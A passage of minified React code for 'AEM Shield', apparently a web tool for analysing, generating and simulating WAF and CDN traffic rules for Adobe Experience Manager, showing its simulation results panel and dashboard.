0:S.status)||301,redirectLocation:r,locationTransforms:a.length>0?a:null,originalLocationConfig:"object"===typeof(null===(C=t.action)||void 0===C?void 0:C.location)?t.action.location:null,triggered:!1};var A;if(n.matches&&!l.redirectLocation)l.matchedRules.push({phase:"redirects",rule:t.name}),l.finalAction="redirect",l.finalStatus=(null===(A=t.action)||void 0===A?void 0:A.status)||301,l.redirectLocation=r,i.triggered=!0;e.rules.push(i)}l.evaluationSteps.push(e)}if(l.wafFlagsDetected.length>0&&"allow"===l.finalAction){var P;(null===d||void 0===d||null===(P=d.rules)||void 0===P?void 0:P.some(e=>{var t;return(null===(t=e.action)||void 0===t?void 0:t.wafFlags)||e.wafFlags}))||l.warnings.push({type:"security",severity:"high",message:"Attack patterns detected (".concat(l.wafFlagsDetected.map(e=>e.flag).join(", "),") but no WAF rules are configured to handle them!")})}l.originalRequest.path!==l.currentRequest.path&&l.warnings.push({type:"info",severity:"low",message:'Request path was transformed: "'.concat(l.originalRequest.path,'" \u2192 "').concat(l.currentRequest.path,'"')}),u(l),f("results")},children:[(0,i.jsx)("svg",{width:"20",height:"20",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:(0,i.jsx)("polygon",{points:"5 3 19 12 5 21 5 3"})}),"Run Simulation"]}),(0,i.jsx)("span",{className:"simulation-hint",children:"Simulates request through all CDN rule phases"})]}),"results"===h&&c&&(0,i.jsxs)("div",{className:"results-panel",children:[(0,i.jsxs)("div",{className:"result-summary card ".concat(c.finalAction),children:[(0,i.jsx)("div",{className:"result-icon",children:"block"===c.finalAction?"\ud83d\udeab":"redirect"===c.finalAction?"\u21aa\ufe0f":"\u2705"}),(0,i.jsxs)("div",{className:"result-content",children:[(0,i.jsx)("h3",{children:"block"===c.finalAction?"Request BLOCKED (HTTP 403)":"redirect"===c.finalAction?"Request REDIRECTED (HTTP ".concat(c.finalStatus,")"):"Request ALLOWED (HTTP 200)"}),c.blockingRule&&(0,i.jsxs)("p",{className:"blocking-rule",children:[(0,i.jsx)("strong",{children:"Blocked by rule:"})," ",(0,i.jsx)("code",{children:c.blockingRule})]}),c.redirectLocation&&(0,i.jsxs)("p",{className:"redirect-info",children:[(0,i.jsx)("strong",{children:"Redirecting to:"})," ",(0,i.jsx)("code",{children:c.redirectLocation})]}),c.selectedOrigin&&(0,i.jsxs)("p",{className:"origin-info",children:[(0,i.jsx)("strong",{children:"Selected Origin:"})," ",(0,i.jsx)("code",{children:c.selectedOrigin})]}),(0,i.jsxs)("p",{className:"result-stats",children:[c.matchedRules.length," rule(s) matched across ",c.evaluationSteps.length," evaluation phases"]})]})]}),"block"===c.finalAction&&c.blockingRuleDetails&&(0,i.jsxs)("div",{className:"block-explanation card",children:[(0,i.jsx)("h4",{children:"\u2753 Why Was This Request Blocked?"}),(0,i.jsxs)("div",{className:"block-details",children:[(0,i.jsxs)("div",{className:"block-rule-name",children:[(0,i.jsx)("strong",{children:"Rule:"})," ",(0,i.jsx)("code",{children:c.blockingRule})]}),(0,i.jsxs)("div",{className:"block-conditions",children:[(0,i.jsx)("strong",{children:"Conditions that triggered the block:"}),(0,i.jsx)("ul",{children:null===(e=c.blockingRuleDetails.conditions)||void 0===e?void 0:e.map((e,t)=>(0,i.jsx)("li",{className:e.matched?"matched":"not-matched",children:e.reason},t))})]}),(0,i.jsxs)("div",{className:"block-suggestion",children:[(0,i.jsx)("strong",{children:"\ud83d\udca1 To Allow This Request:"}),(0,i.jsx)("ul",{children:null===(t=c.blockingRuleDetails.suggestions)||void 0===t?void 0:t.map((e,t)=>(0,i.jsx)("li",{children:e},t))})]})]})]}),c.pathHistory.length>1&&(0,i.jsxs)("div",{className:"path-history card",children:[(0,i.jsx)("h4",{children:"\ud83d\udd04 Path Transformation History"}),(0,i.jsx)("p",{className:"section-description",children:"Shows how the request path was modified through transformation rules"}),(0,i.jsx)("div",{className:"path-timeline",children:c.pathHistory.map((e,t)=>(0,i.jsxs)("div",{className:"path-step ".concat(t===c.pathHistory.length-1?"final":""),children:[(0,i.jsx)("div",{className:"path-step-marker",children:0===t?"\ud83d\udce5":t===c.pathHistory.length-1?"\ud83d\udce4":"\ud83d\udd04"}),(0,i.jsxs)("div",{className:"path-step-content",children:[(0,i.jsx)("div",{className:"path-step-phase",children:e.phase}),(0,i.jsx)("code",{className:"path-step-value",children:e.path}),e.transform&&(0,i.jsxs)("div",{className:"path-step-transform",children:["Transform: ",(0,i.jsx)("code",{children:e.transform})]})]}),t<c.pathHistory.length-1&&(0,i.jsx)("div",{className:"path-step-arrow",children:"\u2193"})]},t))}),(0,i.jsxs)("div",{className:"path-summary",children:[(0,i.jsxs)("div",{className:"path-summary-item before",children:[(0,i.jsx)("span",{className:"label",children:"Original Path"}),(0,i.jsx)("code",{children:c.originalRequest.path})]}),(0,i.jsx)("span",{className:"path-summary-arrow",children:"\u2192"}),(0,i.jsxs)("div",{className:"path-summary-item after",children:[(0,i.jsx)("span",{className:"label",children:"Final Path"}),(0,i.jsx)("code",{children:c.currentRequest.path})]})]})]}),c.warnings.length>0&&(0,i.jsxs)("div",{className:"warnings-card card",children:[(0,i.jsx)("h4",{children:"\u26a0\ufe0f Warnings & Potential Issues"}),(0,i.jsx)("ul",{children:c.warnings.map((e,t)=>(0,i.jsxs)("li",{className:"warning-item ".concat(e.severity),children:[(0,i.jsx)("span",{className:"warning-type",children:e.type.toUpperCase()}),e.message]},t))})]}),c.wafFlagsDetected.length>0&&(0,i.jsxs)("div",{className:"waf-detected card",children:[(0,i.jsx)("h4",{children:"\ud83d\udee1\ufe0f WAF Attack Patterns Detected"}),(0,i.jsx)("p",{className:"section-description",children:"These patterns were detected in the request and may trigger WAF rules"}),(0,i.jsx)("div",{className:"waf-flags",children:c.wafFlagsDetected.map((e,t)=>{var n,r;return(0,i.jsxs)("div",{className:"waf-flag-item",children:[(0,i.jsx)("span",{className:"waf-flag-name",children:e.flag}),(0,i.jsx)("span",{className:"waf-flag-pattern",children:e.pattern}),pt[e.flag]&&(0,i.jsx)("span",{className:"waf-flag-severity",style:{background:null===(n=ht[pt[e.flag].severity])||void 0===n?void 0:n.bg,color:null===(r=ht[pt[e.flag].severity])||void 0===r?void 0:r.color},children:pt[e.flag].severity})]},t)})})]}),(0,i.jsxs)("div",{className:"evaluation-steps",children:[(0,i.jsx)("h4",{children:"\ud83d\udccb Step-by-Step Rule Evaluation"}),(0,i.jsx)("p",{className:"section-description",children:"Rules are evaluated in this exact order. Understanding this order is critical for debugging why requests are blocked or transformed."}),c.evaluationSteps.map((e,t)=>{var n,r,a,s,o;return(0,i.jsxs)("details",{className:"step-card ".concat(e.skipped?"skipped":""),open:!e.skipped&&(null===(n=e.rules)||void 0===n?void 0:n.some(e=>e.matched)),children:[(0,i.jsxs)("summary",{className:"step-header",children:[(0,i.jsx)("span",{className:"step-icon",children:e.icon}),(0,i.jsx)("span",{className:"step-name",children:e.name}),e.skipped?(0,i.jsx)("span",{className:"step-badge skipped",children:"SKIPPED"}):(0,i.jsxs)("span",{className:"step-stats",children:[(null===(r=e.rules)||void 0===r?void 0:r.filter(e=>e.matched).length)||0," / ",(null===(a=e.rules)||void 0===a?void 0:a.length)||0," matched"]})]}),(0,i.jsxs)("div",{className:"step-content",children:[(0,i.jsx)("p",{className:"step-description",children:e.description}),e.skipped&&(0,i.jsx)("div",{className:"step-skip-reason",children:e.skipReason}),(null===(s=e.globalActions)||void 0===s?void 0:s.length)>0&&(0,i.jsxs)("div",{className:"global-actions",children:[(0,i.jsx)("h5",{children:"Global Actions"}),e.globalActions.map((e,t)=>(0,i.jsxs)("div",{className:"global-action-item",children:[(0,i.jsx)("span",{className:"action-type",children:e.type}),(0,i.jsx)("span",{className:"action-desc",children:e.description})]},t))]}),(null===(o=e.rules)||void 0===o?void 0:o.length)>0&&(0,i.jsx)("div",{className:"rules-list",children:e.rules.map((e,t)=>{var n,r;return(0,i.jsxs)("div",{className:"rule-card ".concat(e.matched?"matched":"not-matched"," ").concat(e.isBlocking?"blocking":""),children:[(0,i.jsxs)("div",{className:"rule-header",children:[(0,i.jsx)("span",{className:"rule-match-badge ".concat(e.matched?"yes":"no"),children:e.matched?"\u2713 MATCHED":"\u2717 NOT MATCHED"}),(0,i.jsx)("code",{className:"rule-name",children:e.name}),e.appliedAction&&(0,i.jsx)("span",{className:"rule-action-badge ".concat(e.appliedAction.toLowerCase()),children:e.appliedAction}),e.triggered&&(0,i.jsxs)("span",{className:"rule-action-badge redirect",children:[e.redirectStatus," \u2192 ",e.redirectLocation]})]}),(0,i.jsxs)("div",{className:"rule-conditions",children:[(0,i.jsx)("h6",{children:"Condition Evaluation:"}),b(e.conditionDetails)]}),(null===(n=e.wafFlagsRequired)||void 0===n?void 0:n.length)>0&&(0,i.jsxs)("div",{className:"rule-waf-info",children:[(0,i.jsx)("h6",{children:"WAF Flags Required:"}),(0,i.jsx)("div",{className:"waf-flags-check",children:e.wafFlagsRequired.map(e=>(0,i.jsxs)("span",{className:"waf-flag-check",children:[e,(0,i.jsx)("span",{className:"check-result ".concat(c.wafFlagsDetected.some(t=>t.flag===e)?"found":"not-found"),children:c.wafFlagsDetected.some(t=>t.flag===e)?"\u2713":"\u2717"})]},e))}),(0,i.jsx)("span",{className:"waf-match-result ".concat(e.wafFlagsMatched?"matched":"not-matched"),children:e.wafFlagsMatched?"\u2713 WAF flags matched":"\u2717 Required WAF flags not detected in request"})]}),(null===(r=e.actions)||void 0===r?void 0:r.length)>0&&(0,i.jsxs)("div",{className:"rule-actions",children:[(0,i.jsx)("h6",{children:"Actions Applied:"}),e.actions.map((e,t)=>{var n;return(0,i.jsxs)("div",{className:"action-item ".concat(e.applied?"applied":"not-applied"),children:[(0,i.jsx)("span",{className:"action-type-badge",children:e.type}),(0,i.jsx)("span",{className:"action-description",children:e.description}),e.debug&&(0,i.jsxs)("div",{className:"transform-debug",children:[(0,i.jsxs)("div",{className:"debug-row",children:[(0,i.jsx)("span",{className:"debug-label",children:"Input:"}),(0,i.jsx)("code",{children:e.debug.inputValue})]}),(0,i.jsxs)("div",{className:"debug-row",children:[(0,i.jsx)("span",{className:"debug-label",children:"Regex Pattern:"}),(0,i.jsxs)("code",{children:["/",e.debug.originalMatch,"/"]}),(0,i.jsx)("span",{className:"debug-match ".concat(e.debug.regexMatches?"yes":"no"),children:e.debug.regexMatches?"\u2713 Matched":"\u2717 No Match"})]}),(null===(n=e.debug.captureGroups)||void 0===n?void 0:n.length)>0&&(0,i.jsxs)("div",{className:"debug-row",children:[(0,i.jsx)("span",{className:"debug-label",children:"Capture Groups:"}),e.debug.captureGroups.map((e,t)=>(0,i.jsxs)("code",{className:"capture-group",children:["$",t+1,' = "',e||"(empty)",'"']},t))]}),(0,i.jsxs)("div",{className:"debug-row",children:[(0,i.jsx)("span",{className:"debug-label",children:"Replacement (YAML):"}),(0,i.jsx)("code",{children:e.debug.originalReplacement||"(empty)"})]}),(0,i.jsxs)("div",{className:"debug-row",children:[(0,i.jsx)("span",{className:"debug-label",children:"Replacement (JS):"}),(0,i.jsx)("code",{children:e.debug.jsReplacement||"(empty)"})]}),(0,i.jsxs)("div",{className:"debug-row result",children:[(0,i.jsx)("span",{className:"debug-label",children:"Output:"}),(0,i.jsx)("code",{className:e.applied?"changed":"",children:e.debug.outputValue})]}),e.error&&(0,i.jsxs)("div",{className:"debug-error",children:["\u26a0\ufe0f ",e.error]})]}),!e.debug&&e.regex&&(0,i.jsxs)("div",{className:"action-detail",children:[(0,i.jsx)("span",{children:"Regex:"})," ",(0,i.jsx)("code",{children:e.regex}),(0,i.jsx)("span",{children:"Replacement:"})," ",(0,i.jsx)("code",{children:e.replacement})]})]},t)})]}),e.pathBefore!==e.pathAfter&&e.pathAfter&&(0,i.jsxs)("div",{className:"path-change",children:[(0,i.jsx)("h6",{children:"Path Changed:"}),(0,i.jsxs)("div",{className:"path-change-visual",children:[(0,i.jsx)("code",{className:"before",children:e.pathBefore}),(0,i.jsx)("span",{className:"arrow",children:"\u2192"}),(0,i.jsx)("code",{className:"after",children:e.pathAfter})]})]}),e.rateLimitInfo&&(0,i.jsxs)("div",{className:"rate-limit-info",children:[(0,i.jsx)("h6",{children:"Rate Limiting:"}),(0,i.jsx)("p",{children:e.rateLimitInfo.description})]}),e.selected&&e.originConfig&&(0,i.jsxs)("div",{className:"origin-info-detail",children:[(0,i.jsx)("h6",{children:"Selected Origin Configuration:"}),(0,i.jsxs)("ul",{children:[(0,i.jsxs)("li",{children:[(0,i.jsx)("strong",{children:"Name:"})," ",e.originConfig.name]}),(0,i.jsxs)("li",{children:[(0,i.jsx)("strong",{children:"Domain:"})," ",e.originConfig.domain]}),e.originConfig.forwardHost&&(0,i.jsxs)("li",{children:[(0,i.jsx)("strong",{children:"Forward Host:"})," Yes"]}),e.originConfig.forwardCookie&&(0,i.jsxs)("li",{children:[(0,i.jsx)("strong",{children:"Forward Cookie:"})," Yes"]}),e.originConfig.forwardAuthorization&&(0,i.jsxs)("li",{children:[(0,i.jsx)("strong",{children:"Forward Authorization:"})," Yes"]})]})]}),e.triggered&&e.locationTransforms&&(0,i.jsxs)("div",{className:"redirect-transforms",children:[(0,i.jsx)("h6",{children:"Redirect Location Computed:"}),(0,i.jsx)("div",{className:"transform-steps",children:e.locationTransforms.map((e,t)=>(0,i.jsxs)("div",{className:"transform-step-item",children:[(0,i.jsx)("span",{className:"transform-op",children:e.op}),e.error?(0,i.jsxs)("span",{className:"transform-error",children:["Error: ",e.error]}):(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)("code",{className:"transform-before",children:e.before}),(0,i.jsx)("span",{className:"transform-arrow",children:"\u2192"}),(0,i.jsx)("code",{className:"transform-after",children:e.after})]})]},t))}),(0,i.jsxs)("div",{className:"final-location",children:[(0,i.jsx)("strong",{children:"Final Location:"})," ",(0,i.jsx)("code",{children:e.redirectLocation})]})]})]},t)})}),(!e.rules||0===e.rules.length)&&!e.skipped&&(0,i.jsx)("p",{className:"no-rules",children:"No rules configured for this phase"})]})]},e.phase)})]}),(0,i.jsxs)("div",{className:"final-state card",children:[(0,i.jsx)("h4",{children:"\ud83d\udcdd Final Request State (After All Transformations)"}),(0,i.jsxs)("div",{className:"final-state-grid",children:[(0,i.jsxs)("div",{className:"state-item",children:[(0,i.jsx)("span",{className:"state-label",children:"Path"}),(0,i.jsx)("code",{className:"state-value",children:c.currentRequest.path}),c.originalRequest.path!==c.currentRequest.path&&(0,i.jsxs)("span",{className:"state-changed",children:["Changed from: ",c.originalRequest.path]})]}),(0,i.jsxs)("div",{className:"state-item",children:[(0,i.jsx)("span",{className:"state-label",children:"Domain"}),(0,i.jsx)("code",{className:"state-value",children:c.currentRequest.domain})]}),(0,i.jsxs)("div",{className:"state-item",children:[(0,i.jsx)("span",{className:"state-label",children:"Tier"}),(0,i.jsx)("code",{className:"state-value",children:c.currentRequest.tier})]}),(0,i.jsxs)("div",{className:"state-item",children:[(0,i.jsx)("span",{className:"state-label",children:"Client IP"}),(0,i.jsx)("code",{className:"state-value",children:c.currentRequest.clientIp})]}),(0,i.jsxs)("div",{className:"state-item",children:[(0,i.jsx)("span",{className:"state-label",children:"Country"}),(0,i.jsx)("code",{className:"state-value",children:c.currentRequest.clientCountry})]})]}),c.currentRequest.headers&&Object.keys(c.currentRequest.headers).length>0&&(0,i.jsxs)("div",{className:"headers-set",children:[(0,i.jsx)("h5",{children:"Request Headers (After Transformations)"}),(0,i.jsx)("div",{className:"headers-list",children:Object.entries(c.currentRequest.headers).map(e=>{let[t,n]=e;return(0,i.jsxs)("div",{className:"header-item",children:[(0,i.jsxs)("span",{className:"header-name",children:[t,":"]}),(0,i.jsx)("code",{className:"header-value",children:n})]},t)})})]})]}),Object.keys(c.responseHeaders).length>0&&(0,i.jsxs)("div",{className:"response-headers card",children:[(0,i.jsx)("h4",{children:"\ud83d\udce4 Response Headers (Will Be Set)"}),(0,i.jsx)("p",{className:"section-description",children:"These headers will be added to the response sent to the client"}),(0,i.jsx)("div",{className:"headers-list",children:Object.entries(c.responseHeaders).map(e=>{let[t,n]=e;return(0,i.jsxs)("div",{className:"header-item",children:[(0,i.jsxs)("span",{className:"header-name",children:[t,":"]}),(0,i.jsx)("code",{className:"header-value",children:n})]},t)})})]}),(0,i.jsxs)("div",{className:"cdn-log card",children:[(0,i.jsx)("h4",{children:"\ud83d\udcdd Simulated CDN Log Entry"}),(0,i.jsx)("p",{className:"section-description",children:"This is what would appear in your CDN logs for this request"}),(0,i.jsx)("pre",{className:"log-output",children:JSON.stringify({timestamp:(new Date).toISOString(),request:{method:c.currentRequest.method,originalPath:c.originalRequest.path,transformedPath:c.currentRequest.path,domain:c.currentRequest.domain,queryString:c.currentRequest.queryString||null},client:{ip:c.currentRequest.clientIp,country:c.currentRequest.clientCountry,userAgent:(null===(n=c.currentRequest.userAgent)||void 0===n?void 0:n.substring(0,50))+"..."},tier:c.currentRequest.tier,response:{status:c.finalStatus,action:c.finalAction,blockingRule:c.blockingRule,redirectLocation:c.redirectLocation,selectedOrigin:c.selectedOrigin},waf:{flagsDetected:c.wafFlagsDetected.map(e=>e.flag),rulesMatched:c.matchedRules.filter(e=>"trafficFilters"===e.phase).map(e=>e.rule)},transformations:{pathChanged:c.originalRequest.path!==c.currentRequest.path,rulesApplied:c.matchedRules.filter(e=>"requestTransformations"===e.phase).map(e=>e.rule)}},null,2)})]})]})]})},Ut=e=>{let{onNavigate:t}=e;const[n,a]=(0,r.useState)(!1),[s,o]=(0,r.useState)(!1),[l,c]=(0,r.useState)(!1),u=Object.values(pt).reduce((e,t)=>(e[t.severity]=(e[t.severity]||0)+1,e),{}),d=[{label:"WAF Flags Available",value:Object.keys(pt).length,icon:(0,i.jsx)("svg",{width:"24",height:"24",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:(0,i.jsx)("path",{d:"M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"})}),color:"accent"},{label:"Critical Protections",value:u.critical||0,icon:(0,i.jsxs)("svg",{width:"24",height:"24",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:[(0,i.jsx)("path",{d:"M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"}),(0,i.jsx)("line",{x1:"12",y1:"9",x2:"12",y2:"13"}),(0,i.jsx)("line",{x1:"12",y1:"17",x2:"12.01",y2:"17"})]}),color:"red"},{label:"OWASP Top 10 Coverage",value:Object.keys(dt).filter(e=>dt[e].wafFlags.length>0).length+"/10",icon:(0,i.jsxs)("svg",{width:"24",height:"24",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:[(0,i.jsx)("path",{d:"M22 11.08V12a10 10 0 1 1-5.93-9.14"}),(0,i.jsx)("polyline",{points:"22 4 12 14.01 9 11.01"})]}),color:"green"},{label:"Advanced Use Cases",value:wt.length,icon:(0,i.jsxs)("svg",{width:"24",height:"24",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:[(0,i.jsx)("rect",{x:"3",y:"3",width:"7",height:"7"}),(0,i.jsx)("rect",{x:"14",y:"3",width:"7",height:"7"}),(0,i.jsx)("rect",{x:"14",y:"14",width:"7",height:"7"}),(0,i.jsx)("rect",{x:"3",y:"14",width:"7",height:"7"})]}),color:"blue"}],p=[{id:"analyzer",title:"Rules Analyzer",description:"Paste your existing cdn.yaml configuration and get a human-friendly breakdown of all rules with explanations.",icon:(0,i.jsxs)("svg",{width:"32",height:"32",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"1.5",children:[(0,i.jsx)("circle",{cx:"11",cy:"11",r:"8"}),(0,i.jsx)("path",{d:"m21 21-4.35-4.35"}),(0,i.jsx)("path",{d:"M11 8v6"}),(0,i.jsx)("path",{d:"M8 11h6"})]}),features:["Parse YAML configuration","Explain each rule","Show attack examples","Security score"]},{id:"generator",title:"Rules Generator",description:"Build WAF rules visually with our intuitive interface. Select protections and export valid cdn.yaml.",icon:(0,i.jsx)("svg",{width:"32",height:"32",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"1.5",children:(0,i.jsx)("path",{d:"M14.7 6.3a1 1 0 0 0 0 1.4l1.6 1.6a1 1 0 0 0 1.4 0l3.77-3.77a6 6 0 0 1-7.94 7.94l-6.91 6.91a2.12 2.12 0 0 1-3-3l6.91-6.91a6 6 0 0 1 7.94-7.94l-3.76 3.76z"})}),features:["Visual rule builder","Adobe templates","OWASP protection","Rate limiting"]},{id:"simulator",title:"Rules Simulator",description:"Test your WAF rules by simulating various attack patterns and see how they would be handled.",icon:(0,i.jsx)("svg",{width:"32",height:"32",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"1.5",children:(0,i.jsx)("polygon",{points:"5 3 19 12 5 21 5 3"})}),features:["Attack simulation","Rule matching","OWASP scenarios","CDN log preview"]}];return(0,i.jsxs)("div",{className:"dashboard",children:[(0,i.jsx)("div",{className:"dashboard-header",children:(0,i.jsxs)("div",{className:"dashboard-intro",children:[(0,i.jsx)("h1",{children:"Welcome to AEM Shield"}),(0,i.jsx)("p",{children:"Professional WAF rules management for Adobe Experience Manager Cloud Service. Protect your AEM websites from DoS, DDoS, malicious traffic and sophisticated attacks."})]})}),(0,i.jsx)("div",{className:"stats-grid",children:d.map((e,t)=>(0,i.jsxs)("div",{className:"stat-card stat-".concat(e.color),children:[(0,i.jsx)("div",{className:"stat-icon",children:e.icon}),(0,i.jsxs)("div",{className:"stat-content",children:[(0,i.jsx)("span",{className:"stat-value",children:e.value}),(0,i.jsx)("span",{className:"stat-label",children:e.label})]})]},t))}),(0,i.jsxs)("section",{className:"dashboard-section",children:[(0,i.jsxs)("h2",{className:"section-title",children:[(0,i.jsx)("svg",{width:"20",height:"20",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:(0,i.jsx)("path",{d:"M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"})}),"Rule Categories"]}),(0,i.jsx)("div",{className:"category-grid",children:Object.entries(ut).map(e=>{let[t,n]=e;return(0,i.jsxs)("div",{className:"category-card ".concat(t),children:[(0,i.jsx)("div",{className:"category-header",children:(0,i.jsx)("span",{className:"category-badge ".concat(t),children:"standard"===t?"Included":"License Required"})}),(0,i.jsx)("h3",{children:n.name}),(0,i.jsx)("p",{children:n.description}),(0,i.jsxs)("div",{className:"category-use-cases",children:[(0,i.jsx)("strong",{children:"Use Cases:"}),(0,i.jsx)("ul",{children:n.useCases.slice(0,3).map((e,t)=>(0,i.jsx)("li",{children:e},t))})]}),(0,i.jsxs)("div",{className:"category-mode",children:[(0,i.jsx)("span",{className:"mode-label",children:"Recommended:"}),(0,i.jsx)("span",{className:"mode-value",children:n.recommendedMode})]})]},t)})})]}),(0,i.jsxs)("section",{className:"dashboard-section",children:[(0,i.jsxs)("h2",{className:"section-title",children:[(0,i.jsx)("svg",{width:"20",height:"20",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:(0,i.jsx)("polygon",{points:"13 2 3 14 12 14 11 22 21 10 12 10 13 2"})}),"Quick Access"]}),(0,i.jsxs)("div",{className:"quick-links",children:[(0,i.jsxs)("button",{className:"quick-link",onClick:()=>o(!s),children:[(0,i.jsx)("span",{className:"quick-link-icon",children:"\ud83d\udccb"}),(0,i.jsx)("span",{className:"quick-link-text",children:"Deployment Workflow"})]}),(0,i.jsxs)("button",{className:"quick-link",onClick:()=>a(!n),children:[(0,i.jsx)("span",{className:"quick-link-icon",children:"\ud83d\udd12"}),(0,i.jsx)("span",{className:"quick-link-text",children:"OWASP Top 10 Coverage"})]}),(0,i.jsxs)("button",{className:"quick-link",onClick:()=>c(!l),children:[(0,i.jsx)("span",{className:"quick-link-icon",children:"\ud83d\udca1"}),(0,i.jsx)("span",{className:"quick-link-text",children:"Advanced Use Cases"})]}),(0,i.jsxs)("a",{className:"quick-link",href:"https://experienceleague.adobe.com/en/docs/experience-manager-learn/cloud-service/security/traffic-filter-and-waf-rules/overview",target:"_blank",rel:"noopener noreferrer",children:[(0,i.jsx)("span",{className:"quick-link-icon",children:"\ud83d\udcda"}),(0,i.jsx)("span",{className:"quick-link-text",children:"Adobe Tutorials \u2197"})]})]})]}),s&&(0,i.jsxs)("section",{className:"dashboard-section animate-slide-up",children:[(0,i.jsxs)("div",{className:"panel-header",children:[(0,i.jsxs)("h2",{className:"section-title",children:[(0,i.jsx)("svg",{width:"20",height:"20",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:(0,i.jsx)("polyline",{points:"22 12 18 12 15 21 9 3 6 12 2 12"})}),"Deployment Workflow"]}),(0,i.jsx)("button",{className:"btn btn-ghost btn-sm",onClick:()=>o(!1),children:"\xd7"})]}),(0,i.jsx)("div",{className:"workflow-steps",children:bt.steps.map((e,t)=>(0,i.jsxs)("div",{className:"workflow-step",children:[(0,i.jsx)("div",{className:"step-number",children:e.step}),(0,i.jsxs)("div",{className:"step-content",children:[(0,i.jsx)("h4",{children:e.title}),(0,i.jsx)("p",{children:e.description}),(0,i.jsx)("span",{className:"step-action",children:e.action})]}),t<bt.steps.length-1&&(0,i.jsx)("div",{className:"step-arrow",children:"\u2192"})]},t))}),(0,i.jsxs)("div",{className:"workflow-exception",children:[(0,i.jsx)("strong",{children:"\u26a1 Exception:"})," ",bt.exceptions[0].flag," is safe to deploy in BLOCK mode immediately."]})]}),n&&(0,i.jsxs)("section",{className:"dashboard-section animate-slide-up",children:[(0,i.jsxs)("div",{className:"panel-header",children:[(0,i.jsxs)("h2",{className:"section-title",children:[(0,i.jsx)("svg",{width:"20",height:"20",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:(0,i.jsx)("path",{d:"M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"})}),"OWASP Top 10 (2021) Coverage"]}),(0,i.jsx)("button",{className:"btn btn-ghost btn-sm",onClick:()=>a(!1),children:"\xd7"})]}),(0,i.jsx)("div",{className:"owasp-grid",children:Object.entries(dt).map(e=>{let[t,n]=e;return(0,i.jsxs)("div",{className:"owasp-card ".concat(n.wafFlags.length>0?"covered":"partial"),children:[(0,i.jsxs)("div",{className:"owasp-header",children:[(0,i.jsx)("span",{className:"owasp-code",children:t}),(0,i.jsx)("span",{className:"owasp-status ".concat(n.wafFlags.length>0?"covered":"partial"),children:n.wafFlags.length>0?"\u2713 Protected":"\u25cb Partial"})]}),(0,i.jsx)("h4",{children:n.name}),(0,i.jsx)("p",{children:n.description}),n.wafFlags.length>0&&(0,i.jsxs)("div",{className:"owasp-flags",children:[(0,i.jsx)("strong",{children:"WAF Flags:"}),(0,i.jsx)("div",{className:"flag-tags",children:n.wafFlags.map(e=>(0,i.jsx)("code",{className:"flag-tag",children:e},e))})]}),(0,i.jsxs)("div",{className:"owasp-mitigations",children:[(0,i.jsx)("strong",{children:"Mitigations:"})," ",n.mitigations.join(", ")]})]},t)})})]}),l&&(0,i.jsxs)("section",{className:"dashboard-section animate-slide-up",children:[(0,i.jsxs)("div",{className:"panel-header",children:[(0,i.jsxs)("h2",{className:"section-title",children:[(0,i.jsx)("svg",{width:"20",height:"20",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:(0,i.jsx)("polygon",{points:"13 2 3 14 12 14 11 22 21 10 12 10 13 2"})}),"Advanced Use Cases"]}),(0,i.jsx)("button",{className:"btn btn-ghost btn-sm",onClick:()=>c(!1),children:"\xd7"})]}),(0,i.jsx)("div",{className:"use-cases-grid",children:wt.map(e=>(0,i.jsxs)("div",{className:"use-case-card",children:[(0,i.jsx)("div",{className:"use-case-header",children:(0,i.jsx)("span",{className:"use-case-category",children:e.category})}),(0,i.jsx)("h4",{children:e.title}),(0,i.jsx)("p",{children:e.description}),(0,i.jsx)("pre",{className:"use-case-yaml",children:e.yaml}),(0,i.jsxs)("div",{className:"use-case-explanation",children:[(0,i.jsx)("strong",{children:"Explanation:"})," ",e.explanation]}),(0,i.jsxs)("div",{className:"use-case-tag",children:[(0,i.jsx)("strong",{children:"Use Case:"})," ",e.useCase]})]},e.id))})]}),(0,i.jsxs)("section",{className:"dashboard-section",children:[(0,i.jsxs)("h2",{className:"section-title",children:[(0,i.jsxs)("svg",{width:"20",height:"20",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:[(0,i.jsx)("path",{d:"M22 11.08V12a10 10 0 1 1-5.93-9.14"}),(0,i.jsx)("polyline",{points:"22 4 12 14.01 9 11.01"})]}),"Get Started"]}),(0,i.jsx)("div",{className:"feature-grid",children:p.map(e=>(0,i.jsxs)("div",{className:"feature-card",onClick:()=>t(e.id),children:[(0,i.jsx)("div",{className:"feature-icon",children:e.icon}),(0,i.jsx)("h3",{children:e.title}),(0,i.jsx)("p",{children:e.description}),(0,i.jsx)("ul",{className:"feature-list",children:e.features.map((e,t)=>(0,i.jsxs)("li",{children:[(0,i.jsx)("svg",{width:"14",height:"14",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:(0,i.jsx)("polyline",{points:"20 6 9 17 4 12"})}),e]},t))}),(0,i.jsxs)("span",{className:"feature-cta",children:["Get Started",(0,i.jsxs)("svg",{width:"16",height:"16",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:[(0,i.jsx)("line",{x1:"5",y1:"12",x2:"19",y2:"12"}),(0,i.jsx)("polyline",{points:"12 5 19 12 12 